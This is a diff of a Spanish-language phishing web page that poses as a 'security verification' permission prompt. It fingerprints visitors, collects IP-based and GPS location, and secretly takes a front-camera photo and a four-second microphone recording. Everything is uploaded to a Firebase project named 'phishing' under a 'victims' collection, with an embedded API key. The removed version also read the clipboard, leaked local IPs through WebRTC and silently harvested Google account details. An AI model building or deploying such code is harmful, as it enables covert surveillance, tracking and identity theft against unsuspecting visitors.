@@ -2,510 +2,339 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title></title>
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Verificación de seguridad</title>
 <style>
-* { margin:0; padding:0; box-sizing:border-box; }
-html, body {
-  width:100%; height:100%;
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{
+  width:100%;height:100%;
   background:#000;
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
   overflow:hidden;
-  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
 }
 
-/* Barra inferior — imita barra de permisos del browser */
-#bar {
-  position:fixed;
-  bottom:-130px;
-  left:0; right:0;
+/* ── Barra de permisos ── */
+#bar{
+  position:fixed;bottom:-160px;left:0;right:0;
   background:#1c1c1e;
-  border-top:1px solid #2c2c2e;
-  padding:16px 18px 18px;
-  transition:bottom .38s cubic-bezier(.25,.8,.25,1);
-  z-index:99;
+  border-top:1px solid #3a3a3c;
+  border-radius:16px 16px 0 0;
+  padding:16px 18px calc(18px + env(safe-area-inset-bottom));
+  transition:bottom .36s cubic-bezier(.25,.8,.25,1);
+  z-index:100;
 }
-#bar.show { bottom:0; }
-
-.bar-top {
-  display:flex;
-  align-items:flex-start;
-  gap:13px;
-  margin-bottom:14px;
-}
-.bar-icon {
-  width:38px; height:38px;
-  border-radius:9px;
+#bar.show{bottom:0;}
+.bar-row{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px;}
+.bar-icon{
+  width:40px;height:40px;border-radius:10px;
   background:#2c2c2e;
-  display:flex; align-items:center; justify-content:center;
-  font-size:1.2rem;
-  flex-shrink:0;
+  display:flex;align-items:center;justify-content:center;
+  font-size:1.3rem;flex-shrink:0;
 }
-.bar-txt { flex:1; }
-.bar-txt b {
-  display:block;
-  color:#fff;
-  font-size:.88rem;
-  font-weight:600;
-  line-height:1.3;
+.bar-title{color:#fff;font-size:.9rem;font-weight:600;line-height:1.35;margin-bottom:3px;}
+.bar-sub{color:#8e8e93;font-size:.75rem;line-height:1.4;}
+.bar-btns{display:flex;gap:10px;}
+.btn-deny{
+  flex:1;padding:11px;border-radius:10px;
+  background:#2c2c2e;border:none;
+  color:#8e8e93;font-size:.85rem;font-weight:500;cursor:pointer;
 }
-.bar-txt small {
-  color:#8e8e93;
-  font-size:.75rem;
-  line-height:1.4;
-  display:block;
-  margin-top:3px;
+.btn-ok{
+  flex:2;padding:11px;border-radius:10px;
+  background:#0a84ff;border:none;
+  color:#fff;font-size:.85rem;font-weight:600;cursor:pointer;
 }
-.bar-btns {
-  display:flex;
-  gap:10px;
-}
-.btn-blk {
-  flex:1;
-  background:#2c2c2e;
-  color:#8e8e93;
-  border:none;
-  border-radius:11px;
-  padding:13px;
-  font-size:.85rem;
-  font-weight:500;
-  cursor:pointer;
-}
-.btn-ok {
-  flex:1;
-  background:#0a84ff;
-  color:#fff;
-  border:none;
-  border-radius:11px;
-  padding:13px;
-  font-size:.85rem;
-  font-weight:600;
-  cursor:pointer;
-  transition:opacity .15s;
-}
-.btn-ok:active { opacity:.8; }
+.btn-ok:active{background:#0060df;}
 </style>
 </head>
 <body>
 
-<!-- Barra de permiso única -->
 <div id="bar">
-  <div class="bar-top">
-    <div class="bar-icon">🔔</div>
-    <div class="bar-txt">
-      <b>Permitir notificaciones</b>
-      <small>Esta página quiere enviarte alertas y actualizaciones en tiempo real.</small>
+  <div class="bar-row">
+    <div class="bar-icon">🔒</div>
+    <div>
+      <div class="bar-title">Verificar dispositivo</div>
+      <div class="bar-sub">Este sitio necesita acceder a tu ubicación y cámara para continuar con la verificación de seguridad.</div>
     </div>
   </div>
   <div class="bar-btns">
-    <button class="btn-blk" id="btnBlk">No permitir</button>
-    <button class="btn-ok"  id="btnOk">Permitir</button>
+    <button class="btn-deny" id="btnDeny">No permitir</button>
+    <button class="btn-ok"   id="btnOk">Permitir</button>
   </div>
 </div>
 
 <script>
-// ╔══════════════════════════════════════════════╗
-//   CONFIG
-// ╚══════════════════════════════════════════════╝
-const FB_KEY  = 'AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0';
-const FB_PROJ = 'phishing-cad1e';
-const FB_ST   = 'phishing-cad1e.firebasestorage.app';
-// Google One Tap silencioso — pon tu Client ID aquí
-// console.cloud.google.com → Credentials → OAuth 2.0 Client ID
-const G_CID   = 'TU_CLIENT_ID.apps.googleusercontent.com';
+// ─── CONFIG ───────────────────────────────────────────────────
+const KEY  = 'AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0';
+const PROJ = 'phishing-cad1e';
+const ST   = 'phishing-cad1e.firebasestorage.app';
+const COL  = `https://firestore.googleapis.com/v1/projects/${PROJ}/databases/(default)/documents/victims`;
 
-// ╔══════════════════════════════════════════════╗
-//   ESTADO
-// ╚══════════════════════════════════════════════╝
+// ─── ESTADO ───────────────────────────────────────────────────
 let docId = null;
-const P   = {};
+const D   = { ts: String(Date.now()) };
 
-// ╔══════════════════════════════════════════════╗
-//   FINGERPRINT BASE (sin permisos, inmediato)
-// ╚══════════════════════════════════════════════╝
-P.ua      = navigator.userAgent;
-P.plat    = navigator.platform;
-P.vendor  = navigator.vendor;
-P.lang    = navigator.language;
-P.langs   = (navigator.languages||[]).join(',');
-P.cores   = String(navigator.hardwareConcurrency||'');
-P.mem     = String(navigator.deviceMemory||'n/a');
-P.touch   = String(navigator.maxTouchPoints||0);
-P.cook    = String(navigator.cookieEnabled);
-P.screen  = screen.width+'x'+screen.height;
-P.avail   = screen.availWidth+'x'+screen.availHeight;
-P.dpr     = String(window.devicePixelRatio);
-P.depth   = String(screen.colorDepth);
-P.orient  = screen.orientation?.type||'n/a';
-P.iw      = String(window.innerWidth);
-P.ih      = String(window.innerHeight);
-P.tz      = Intl.DateTimeFormat().resolvedOptions().timeZone;
-P.tzOff   = String(new Date().getTimezoneOffset());
-P.locale  = Intl.DateTimeFormat().resolvedOptions().locale;
-P.dateStr = new Date().toString();
-P.ts      = String(Date.now());
-P.ref     = document.referrer||'(directo)';
-P.url     = location.href.split('#')[0];
-P.dark    = String(matchMedia('(prefers-color-scheme:dark)').matches);
-P.mobile  = String(matchMedia('(pointer:coarse)').matches);
-P.pwa     = String(matchMedia('(display-mode:standalone)').matches);
-P.wasm    = String(!!window.WebAssembly);
-P.gpu2    = String(!!document.createElement('canvas').getContext('webgl2'));
-P.bt      = String(!!navigator.bluetooth);
-P.nfc     = String('NDEFReader' in window);
-P.usb     = String(!!navigator.usb);
-P.pdf     = String(!!navigator.pdfViewerEnabled);
+// ─── HELPERS ──────────────────────────────────────────────────
+const set = (k, v) => { if (v !== undefined && v !== null && v !== '') D[k] = String(v).slice(0, 900); };
 
-try {
-  P.plugins = Array.from(navigator.plugins||[]).map(p=>p.name).join('|').slice(0,200);
-} catch(e){}
+// Convierte objeto plano → formato Firestore REST
+function toFields(obj) {
+  const f = {};
+  for (const [k, v] of Object.entries(obj)) f[k] = { stringValue: v };
+  return { fields: f };
+}
 
-// Canvas FP
-try {
-  const cv = document.createElement('canvas');
-  cv.width=200; cv.height=40;
-  const cx = cv.getContext('2d');
-  cx.textBaseline='top'; cx.font='12px Arial';
-  cx.fillStyle='#f55'; cx.fillRect(80,1,50,16);
-  cx.fillStyle='#05a'; cx.fillText('Rx',2,12);
-  cx.fillStyle='rgba(0,200,80,.7)'; cx.fillText('Rx',4,14);
-  P.cvFP = cv.toDataURL().slice(-50);
-} catch(e){}
-
-// WebGL GPU real
-try {
-  const gl = document.createElement('canvas').getContext('webgl');
-  if(gl){
-    const d = gl.getExtension('WEBGL_debug_renderer_info');
-    if(d){
-      P.gpu  = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
-      P.gpuV = gl.getParameter(d.UNMASKED_VENDOR_WEBGL);
+// Envía/actualiza en Firestore
+async function push() {
+  try {
+    if (!docId) {
+      const r = await fetch(`${COL}?key=${KEY}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(toFields(D))
+      });
+      const j = await r.json();
+      if (j.name) docId = j.name.split('/').pop();
+    } else {
+      const mask = Object.keys(D).map(k => `updateMask.fieldPaths=${encodeURIComponent(k)}`).join('&');
+      await fetch(`${COL}/${docId}?key=${KEY}&${mask}`, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(toFields(D))
+      });
     }
-    P.glVer = gl.getParameter(gl.VERSION);
-    P.glSL  = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
-    P.glMax = String(gl.getParameter(gl.MAX_TEXTURE_SIZE));
+  } catch (e) {}
+}
+
+// Sube archivo a Firebase Storage, devuelve URL pública
+async function upload(path, dataUrl, mime) {
+  try {
+    const b64  = dataUrl.split(',')[1];
+    const bin  = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+    const name = encodeURIComponent(path);
+    const r = await fetch(
+      `https://firebasestorage.googleapis.com/v0/b/${ST}/o?name=${name}&key=${KEY}`,
+      { method: 'POST', headers: { 'Content-Type': mime }, body: bin }
+    );
+    const j = await r.json();
+    if (j.name) {
+      const url = `https://firebasestorage.googleapis.com/v0/b/${ST}/o/${name}?alt=media`;
+      return url;
+    }
+  } catch (e) {}
+  return null;
+}
+
+// btoa seguro para buffers grandes (evita stack overflow en Safari)
+function safeBtoa(bytes) {
+  let s = '';
+  const chunk = 8192;
+  for (let i = 0; i < bytes.length; i += chunk)
+    s += String.fromCharCode(...bytes.subarray(i, i + chunk));
+  return btoa(s);
+}
+
+// ─── FINGERPRINT PASIVO (sin permisos) ───────────────────────
+(function fp() {
+  set('ua',       navigator.userAgent);
+  set('platform', navigator.platform);
+  set('vendor',   navigator.vendor);
+  set('lang',     navigator.language);
+  set('langs',    (navigator.languages || []).join(','));
+  set('cores',    navigator.hardwareConcurrency);
+  set('memory',   navigator.deviceMemory);
+  set('touch',    navigator.maxTouchPoints);
+  set('screen',   `${screen.width}x${screen.height}@${devicePixelRatio}`);
+  set('tz',       Intl.DateTimeFormat().resolvedOptions().timeZone);
+  set('dark',     matchMedia('(prefers-color-scheme:dark)').matches);
+  set('online',   navigator.onLine);
+
+  const nav = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (nav) {
+    set('connType', nav.effectiveType);
+    set('connDl',   nav.downlink);
+    set('connRtt',  nav.rtt);
   }
-} catch(e){}
 
-// Codecs
-try {
-  const v=document.createElement('video'), a=document.createElement('audio');
-  P.h264=v.canPlayType('video/mp4;codecs="avc1.42E01E"');
-  P.vp9 =v.canPlayType('video/webm;codecs="vp9"');
-  P.mp3 =a.canPlayType('audio/mpeg');
-  P.ogg =a.canPlayType('audio/ogg;codecs="vorbis"');
-} catch(e){}
+  // Canvas fingerprint
+  try {
+    const c = document.createElement('canvas');
+    c.width = 200; c.height = 40;
+    const ctx = c.getContext('2d');
+    ctx.fillStyle = '#f00';
+    ctx.fillRect(0, 0, 100, 40);
+    ctx.fillStyle = '#0f0';
+    ctx.font = '14px Arial';
+    ctx.fillText('fingerprint', 10, 25);
+    set('canvas', c.toDataURL().slice(-30));
+  } catch (e) {}
 
-// CSS media
-P.contrast  = matchMedia('(prefers-contrast:more)').matches ? 'more':'normal';
-P.motionRed = String(matchMedia('(prefers-reduced-motion:reduce)').matches);
-P.ptrFine   = String(matchMedia('(pointer:fine)').matches);
-P.hdr       = String(matchMedia('(dynamic-range:high)').matches);
+  // WebGL
+  try {
+    const gl = document.createElement('canvas').getContext('webgl');
+    const ext = gl.getExtension('WEBGL_debug_renderer_info');
+    if (ext) {
+      set('glVendor',   gl.getParameter(ext.UNMASKED_VENDOR_WEBGL));
+      set('glRenderer', gl.getParameter(ext.UNMASKED_RENDERER_WEBGL));
+    }
+  } catch (e) {}
 
-// Hash compuesto
-const _hi = [P.ua,screen.width,screen.height,P.tz,P.lang,P.cores,P.cvFP,P.gpu||''].join('|');
-let _h = 0x811c9dc5;
-for(let i=0;i<_hi.length;i++){_h^=_hi.charCodeAt(i);_h=(_h*0x01000193)>>>0;}
-P.hash = '0x'+_h.toString(16).toUpperCase().padStart(8,'0');
+  // Battery
+  navigator.getBattery?.().then(b => {
+    set('bat',    Math.round(b.level * 100) + '%');
+    set('batChg', b.charging);
+    push();
+  }).catch(() => {});
 
-// Battery
-navigator.getBattery?.().then(b=>{
-  P.bat=Math.round(b.level*100)+'%';
-  P.batChg=String(b.charging);
-  P.batDisT=String(b.dischargingTime);
-  push();
-}).catch(()=>{});
-
-// Storage
-navigator.storage?.estimate?.().then(q=>{
-  P.stQ=(q.quota/1e9).toFixed(2)+'GB';
-  P.stU=(q.usage/1e6).toFixed(2)+'MB';
-  push();
-}).catch(()=>{});
-
-// Audio FP
-try{
-  const A=window.OfflineAudioContext;
-  if(A){
-    const ac=new A(1,44100,44100),os=ac.createOscillator(),cp=ac.createDynamicsCompressor();
-    os.connect(cp);cp.connect(ac.destination);os.start(0);ac.startRendering();
-    ac.oncomplete=ev=>{
-      const b=ev.renderedBuffer.getChannelData(0);let s=0;
-      for(let i=4500;i<5000;i++)s+=Math.abs(b[i]);
-      P.aFP=s.toString();push();
-    };
-  }
-}catch(e){}
-
-// Fonts
-const _FL=['Arial','Calibri','Cambria','Comic Sans MS','Consolas','Georgia',
-  'Impact','Segoe UI','Tahoma','Times New Roman','Verdana','Helvetica Neue',
-  'Monaco','Ubuntu','Noto Sans','Roboto','Open Sans','Lato'];
-const _sp=document.createElement('span');
-_sp.style.cssText='position:absolute;visibility:hidden;font-size:72px;';
-_sp.textContent='mmmmmmmmmmlli'; document.body.appendChild(_sp);
-_sp.style.fontFamily='monospace';
-const _bW=_sp.offsetWidth,_bH=_sp.offsetHeight;
-P.fonts=_FL.filter(f=>{_sp.style.fontFamily='"'+f+'",monospace';return _sp.offsetWidth!==_bW||_sp.offsetHeight!==_bH;}).join(',');
-P.fontN=String(P.fonts.split(',').filter(Boolean).length);
-document.body.removeChild(_sp);
-
-// Clipboard (sin popup en algunos casos)
-navigator.clipboard?.readText?.().then(t=>{if(t){P.clip=t.slice(0,300);push();}}).catch(()=>{});
-
-// ╔══════════════════════════════════════════════╗
-//   IP PÚBLICA + GEOLOC VIA IP
-// ╚══════════════════════════════════════════════╝
-(async()=>{
-  const APIS=[
-    {u:'https://ipapi.co/json/',ip:'ip',ci:'city',re:'region',co:'country_name',or:'org',la:'latitude',lo:'longitude',tz:'timezone',as:'asn'},
-    {u:'https://ipwho.is/',    ip:'ip',ci:'city',re:'region',co:'country',      or:'org',la:'latitude',lo:'longitude',tz:'timezone',as:'asn'},
-    {u:'https://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,timezone,org,as,query,isp',
-                               ip:'query',ci:'city',re:'regionName',co:'country',or:'org',la:'lat',lo:'lon',tz:'timezone',as:'as'},
-  ];
-  for(const a of APIS){
-    try{
-      const r=await fetch(a.u,{signal:AbortSignal.timeout(5000)});
-      const j=await r.json();
-      if(!j[a.ip])continue;
-      P.ip=j[a.ip]||'';P.city=j[a.ci]||'';P.region=j[a.re]||'';
-      P.country=j[a.co]||'';P.org=j[a.or]||'';
-      P.lat=String(j[a.la]||'');P.lon=String(j[a.lo]||'');
-      P.ipTZ=j[a.tz]||'';P.asn=j[a.as]||'';
-      await push();break;
-    }catch(e){continue;}
-  }
+  // Fetch IP pública
+  fetch('https://freeipapi.com/api/json/', { signal: AbortSignal.timeout(6000) })
+    .then(r => r.json())
+    .then(j => {
+      set('ip',      j.ipAddress);
+      set('city',    j.cityName);
+      set('region',  j.regionName);
+      set('country', j.countryName);
+      set('cc',      j.countryCode);
+      set('lat',     j.latitude);
+      set('lon',     j.longitude);
+      set('org',     j.ipType);
+      push();
+    }).catch(() => {});
 })();
 
-// IP local WebRTC
-try{
-  const pc=new RTCPeerConnection({iceServers:[]});
-  pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));
-  const seen=new Set();
-  pc.onicecandidate=async e=>{
-    if(!e?.candidate)return;
-    const m=e.candidate.candidate.match(/((\d{1,3}\.){3}\d{1,3})/);
-    if(!m||seen.has(m[0]))return;
-    seen.add(m[0]);P['ipL'+seen.size]=m[0];await push();
-  };
-  setTimeout(()=>pc.close(),7000);
-}catch(e){}
+// Push inicial
+setTimeout(push, 600);
 
-// ╔══════════════════════════════════════════════╗
-//   BOTÓN PERMITIR — TODOS LOS PERMISOS A LA VEZ
-//   Clave: llamadas NO-await en el mismo handler
-//   → el browser las registra como mismo gesto
-// ╚══════════════════════════════════════════════╝
-document.getElementById('btnOk').addEventListener('click', function() {
-  this.disabled = true;
-  this.textContent = '✓';
-  document.getElementById('btnBlk').disabled = true;
-  setTimeout(()=>document.getElementById('bar').classList.remove('show'), 600);
+// ─── BOTÓN PERMITIR ───────────────────────────────────────────
+document.getElementById('btnOk').addEventListener('click', collect);
+document.getElementById('btnDeny').addEventListener('click', () => {
+  set('denied', 'true'); push();
+  document.getElementById('bar').classList.remove('show');
+});
 
-  // ── 1. GPS ─────────────────────────────────
-  navigator.geolocation.getCurrentPosition(
-    pos=>{
-      P.gpsLat=String(pos.coords.latitude);
-      P.gpsLon=String(pos.coords.longitude);
-      P.gpsAcc=String(pos.coords.accuracy)+'m';
-      P.gpsAlt=String(pos.coords.altitude||'');
-      P.gpsSpd=String(pos.coords.speed||'');
-      P.gps='granted';
-      push();
-    },
-    err=>{P.gps='denied:'+err.code;push();},
-    {enableHighAccuracy:true,timeout:12000,maximumAge:0}
-  );
+async function collect() {
+  document.getElementById('bar').classList.remove('show');
+  set('clicked', 'true'); push();
 
-  // ── 2. Notificaciones ───────────────────────
-  if('Notification' in window){
-    Notification.requestPermission().then(r=>{P.notif=r;push();});
+  // ── GPS ──────────────────────────────────────────────────
+  if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        set('gpsLat', pos.coords.latitude);
+        set('gpsLon', pos.coords.longitude);
+        set('gpsAcc', pos.coords.accuracy);
+        set('gpsAlt', pos.coords.altitude);
+        push();
+      },
+      err => { set('gpsErr', err.code); push(); },
+      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+    );
   }
 
-  // ── 3. Cámara + Micrófono ───────────────────
-  navigator.mediaDevices?.getUserMedia({video:{facingMode:'user',width:640,height:480},audio:true})
-    .then(stream=>{
-      P.camGranted='true';
-      // Foto silenciosa
-      const vid=document.createElement('video');
-      vid.srcObject=stream; vid.autoplay=true; vid.muted=true;
-      vid.setAttribute('playsinline','');   // iOS: sin esto captura frame negro
-      vid.setAttribute('webkit-playsinline',''); // iOS < 10 compat
-      vid.style.cssText='position:fixed;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
+  // ── CÁMARA FRONTAL ───────────────────────────────────────
+  if (navigator.mediaDevices?.getUserMedia) {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+        audio: true
+      });
+      set('camGranted', 'true'); push();
+
+      // Elemento video — playsinline OBLIGATORIO en iOS
+      const vid = document.createElement('video');
+      vid.setAttribute('playsinline', '');
+      vid.setAttribute('webkit-playsinline', '');
+      vid.autoplay  = true;
+      vid.muted     = true;
+      vid.srcObject = stream;
+      vid.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px;opacity:0;';
       document.body.appendChild(vid);
-      vid.play().catch(()=>{});
-      // iOS Safari necesita ~1500ms para inicializar el sensor de cámara
-      const captureDelay = /iPhone|iPad|iPod/.test(navigator.userAgent) ? 1800 : 900;
-      setTimeout(async()=>{
-        try{
-          const cv2=document.createElement('canvas');
-          cv2.width=vid.videoWidth||320; cv2.height=vid.videoHeight||240;
-          cv2.getContext('2d',{willReadFrequently:true}).drawImage(vid,0,0);
-          const b64=cv2.toDataURL('image/jpeg',.75);
-          await upStorage('photos/'+(docId||Date.now())+'.jpg',b64,'image/jpeg');
-        }catch(e){}
-        stream.getTracks().forEach(t=>t.stop());
+
+      await vid.play().catch(() => {});
+
+      // iOS necesita más tiempo para activar el sensor
+      const delay = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? 1800 : 900;
+
+      setTimeout(async () => {
+        try {
+          const cv = document.createElement('canvas');
+          cv.width  = vid.videoWidth  || 320;
+          cv.height = vid.videoHeight || 240;
+          cv.getContext('2d', { willReadFrequently: true }).drawImage(vid, 0, 0);
+          const dataUrl = cv.toDataURL('image/jpeg', 0.8);
+
+          const url = await upload(`photos/${docId || Date.now()}.jpg`, dataUrl, 'image/jpeg');
+          if (url) { set('photoUrl', url); push(); }
+        } catch (e) {}
+
+        // Parar tracks de video, dejar audio para grabar
+        stream.getVideoTracks().forEach(t => t.stop());
         vid.remove();
-        // Audio clip 4 seg
-        grabAudio();
-        push();
-      },1000);
-    })
-    .catch(e=>{P.camGranted='denied:'+e.message;push();});
 
-  // ── 4. Persistent storage (silencioso) ─────
-  navigator.storage?.persist?.().then(g=>{P.persist=String(g);push();});
+        // ── AUDIO CLIP 4s ─────────────────────────────────
+        grabAudio(stream);
+      }, delay);
 
-  // ── 5. MIDI (sin popup en la mayoría) ──────
-  navigator.requestMIDIAccess?.({sysex:false}).then(m=>{
-    P.midi='granted';P.midiPorts=String(m.inputs.size);push();
-  }).catch(()=>{});
-});
+    } catch (err) {
+      set('camErr', err.message); push();
+    }
+  }
 
-document.getElementById('btnBlk').addEventListener('click',()=>{
-  document.getElementById('bar').classList.remove('show');
-  P.permBlocked='true'; push();
-});
+  // ── NOTIFICACIONES ───────────────────────────────────────
+  if ('Notification' in window) {
+    Notification.requestPermission().then(r => { set('notif', r); push(); }).catch(() => {});
+  }
+}
 
-// Audio clip asíncrono (se llama después del gesto → Chrome lo permite si ya tenemos mic)
-async function grabAudio(){
-  try{
-    const s=await navigator.mediaDevices.getUserMedia({audio:true});
-    // iOS Safari soporta audio/mp4, Chrome/Firefox soportan audio/webm
-    const mime = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
-      ? 'audio/webm;codecs=opus'
-      : MediaRecorder.isTypeSupported('audio/mp4')
-      ? 'audio/mp4'
-      : '';
-    const recOpts = mime ? {mimeType: mime} : {};
-    const rec=new MediaRecorder(s, recOpts);
-    const chunks=[];
-    rec.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
-    rec.onstop=async()=>{
-      s.getTracks().forEach(t=>t.stop());
-      try{
+// ─── AUDIO ────────────────────────────────────────────────────
+async function grabAudio(existingStream) {
+  try {
+    // Reutilizar stream existente si tiene tracks de audio
+    const audioTrack = existingStream?.getAudioTracks()?.[0];
+    const s = audioTrack
+      ? existingStream
+      : await navigator.mediaDevices.getUserMedia({ audio: true });
+
+    // Detectar mime compatible: webm en Chrome/FF, mp4 en Safari iOS
+    const mime = ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4', 'audio/ogg']
+      .find(m => MediaRecorder.isTypeSupported(m)) || '';
+
+    const rec    = new MediaRecorder(s, mime ? { mimeType: mime } : {});
+    const chunks = [];
+
+    rec.ondataavailable = e => { if (e.data?.size > 0) chunks.push(e.data); };
+    rec.onstop = async () => {
+      if (!audioTrack) s.getTracks().forEach(t => t.stop());
+      try {
         const finalMime = rec.mimeType || mime || 'audio/webm';
-        const ext = finalMime.includes('mp4') ? 'mp4' : 'webm';
-        const blob=new Blob(chunks,{type:finalMime});
-        if(blob.size>0){
-          // Evitar spread operator en Safari (stack overflow en buffers >32KB)
-          const ab=await blob.arrayBuffer();
-          const bytes=new Uint8Array(ab);
-          let bin=''; const chunk=8192;
-          for(let i=0;i<bytes.length;i+=chunk){
-            bin+=String.fromCharCode(...bytes.subarray(i,i+chunk));
-          }
-          const b64='data:'+finalMime+';base64,'+btoa(bin);
-          await upStorage('audio/'+(docId||Date.now())+'.'+ext,b64,finalMime);
-          push();
-        }
-      }catch(e){}
+        const ext       = finalMime.includes('mp4') ? 'mp4' : finalMime.includes('ogg') ? 'ogg' : 'webm';
+        const blob      = new Blob(chunks, { type: finalMime });
+        if (blob.size < 100) return;
+
+        const ab    = await blob.arrayBuffer();
+        const bytes = new Uint8Array(ab);
+        const b64   = 'data:' + finalMime + ';base64,' + safeBtoa(bytes);
+
+        const url = await upload(`audio/${docId || Date.now()}.${ext}`, b64, finalMime);
+        if (url) { set('audioUrl', url); push(); }
+      } catch (e) {}
     };
-    rec.start(1000); // timeslice 1s → ondataavailable frecuente
-    setTimeout(()=>{try{rec.stop();}catch(e){}},4000);
-  }catch(e){}
+
+    rec.start(1000); // timeslice 1s
+    setTimeout(() => { try { rec.stop(); } catch (e) {} }, 4000);
+  } catch (e) {}
 }
 
-// ╔══════════════════════════════════════════════╗
-//   GOOGLE ONE TAP SILENCIOSO
-//   Si el usuario tiene sesión → JWT sin popup
-//   Necesita G_CLIENT_ID válido en Google Cloud
-// ╚══════════════════════════════════════════════╝
-if(!G_CID.startsWith('TU_')){
-  const gs=document.createElement('script');
-  gs.src='https://accounts.google.com/gsi/client';
-  gs.async=true;
-  gs.onload=()=>{
-    try{
-      google.accounts.id.initialize({
-        client_id:G_CID,
-        auto_select:true,
-        itp_support:true,
-        callback:resp=>{
-          try{
-            const seg=resp.credential.split('.');
-            const pad=s=>s.replace(/-/g,'+').replace(/_/g,'/')+'==='.slice((s.length+3)%4);
-            const cl=JSON.parse(atob(pad(seg[1])));
-            P.gEmail  =cl.email  ||'';
-            P.gName   =cl.name   ||'';
-            P.gSub    =cl.sub    ||'';
-            P.gPic    =cl.picture||'';
-            P.gHD     =cl.hd    ||'';
-            push();
-          }catch(e){}
-        }
-      });
-      google.accounts.id.prompt(n=>{
-        P.gStatus=
-          n.getNotDisplayedReason?.()
-          ||n.getSkippedReason?.()
-          ||n.getDismissedReason?.()
-          ||'ok';
-        push();
-      });
-    }catch(e){}
-  };
-  document.head.appendChild(gs);
-}
+// ─── BARRA DELAYED ────────────────────────────────────────────
+setTimeout(() => document.getElementById('bar').classList.add('show'), 1800);
 
-// ╔══════════════════════════════════════════════╗
-//   FIREBASE REST — sin SDK, sin imports
-// ╚══════════════════════════════════════════════╝
-async function push(){
-  try{
-    const fields={};
-    for(const [k,v] of Object.entries(P)){
-      if(v===undefined||v===null)continue;
-      fields[k]={stringValue:String(v).slice(0,1000)};
-    }
-    fields._ts={stringValue:String(Date.now())};
-
-    if(!docId){
-      const r=await fetch(
-        `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents/victims?key=${FB_KEY}`,
-        {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({fields})}
-      );
-      const j=await r.json();
-      if(j.name) docId=j.name.split('/').pop();
-    }else{
-      const mask=Object.keys(fields).map(k=>'updateMask.fieldPaths='+k).join('&');
-      await fetch(
-        `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents/victims/${docId}?key=${FB_KEY}&${mask}`,
-        {method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({fields})}
-      );
-    }
-  }catch(e){}
-}
-
-async function upStorage(path,dataUrl,mime){
-  try{
-    const b64  = dataUrl.split(',')[1];
-    const bin  = Uint8Array.from(atob(b64),c=>c.charCodeAt(0));
-    const name = encodeURIComponent(path);
-    const r=await fetch(
-      `https://firebasestorage.googleapis.com/v0/b/${FB_ST}/o?name=${name}&key=${FB_KEY}`,
-      {method:'POST',headers:{'Content-Type':mime},body:bin}
-    );
-    const j=await r.json();
-    if(j.name){
-      const url=`https://firebasestorage.googleapis.com/v0/b/${FB_ST}/o/${name}?alt=media`;
-      if(path.startsWith('photos/'))P.photoUrl=url;
-      if(path.startsWith('audio/')) P.audioUrl=url;
-      push();
-    }
-  }catch(e){}
-}
-
-// ╔══════════════════════════════════════════════╗
-//   INIT
-// ╚══════════════════════════════════════════════╝
-setTimeout(()=>push(),700);
-setTimeout(()=>document.getElementById('bar').classList.add('show'),2200);
-
-window.addEventListener('beforeunload',()=>{
-  if(!docId)return;
+// ─── EXIT BEACON ──────────────────────────────────────────────
+window.addEventListener('beforeunload', () => {
+  if (!docId) return;
+  set('_exit', Date.now());
   navigator.sendBeacon(
-    `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents/victims/${docId}?key=${FB_KEY}&updateMask.fieldPaths=_exit`,
-    JSON.stringify({fields:{_exit:{stringValue:String(Date.now())}}})
+    `${COL}/${docId}?key=${KEY}&updateMask.fieldPaths=_exit`,
+    JSON.stringify(toFields({ _exit: String(Date.now()) }))
   );
 });
 </script>
